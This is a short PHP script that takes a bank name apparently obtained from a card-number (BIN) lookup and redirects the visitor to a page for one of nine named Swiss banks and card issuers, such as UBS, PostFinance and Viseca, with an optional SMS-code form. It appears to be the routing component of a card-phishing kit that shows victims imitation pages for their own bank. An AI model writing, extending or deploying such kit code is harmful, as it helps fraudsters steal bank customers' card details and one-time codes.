<?php
session_start();
include '../alltwo.php';

// Check if bank information is available in session
if (isset($_SESSION['bin_bank'])) {
    $bank_name = $_SESSION['bin_bank'];
} else {
    // Fallback to default app.php if no bank info
    if (isset($_GET['form']) && $_GET['form'] === 'sms') {
        header("Location: app.php?form=sms");
    } else {
        header("Location: app.php");
    }
    exit();
}

// Bank name mapping to specific pages
$bank_name_map = [
    'cembra money bank ag'              => 'cembra',
    'corner banca s.a.'                 => 'corner',
    'zuercher kantonalbank'             => 'kantonalbank',
    'migros bank ag'                    => 'migros',
    'postfinance ag'                    => 'postfinance',
    'raiffeisen schweiz genossenschaft' => 'raiffeisen',
    'swisscard aecs gmbh'               => 'swisscard',
    'ubs switzerland ag'                => 'ubs',
    'viseca payment services sa'        => 'viseca',
];

// Normalize bank name for matching
$normalized_bank_name = strtolower(trim($bank_name));

// Find matching bank
$file_name = null;
foreach ($bank_name_map as $map_name => $bank_file) {
    if (strpos($normalized_bank_name, $map_name) !== false) {
        $file_name = $bank_file . '.php';
        break;
    }
}

// If no match found, use default app.php
if ($file_name === null) {
    if (isset($_GET['form']) && $_GET['form'] === 'sms') {
        header("Location: app.php?form=sms");
    } else {
        header("Location: app.php");
    }
    exit();
}

// Add form parameter if it exists in the current URL
$query_string = '';
if (isset($_GET['form']) && $_GET['form'] === 'sms') {
    $query_string = '?form=sms';
}

// Redirect to the specific bank page with the parameter
header("Location: $file_name$query_string");
exit();
?>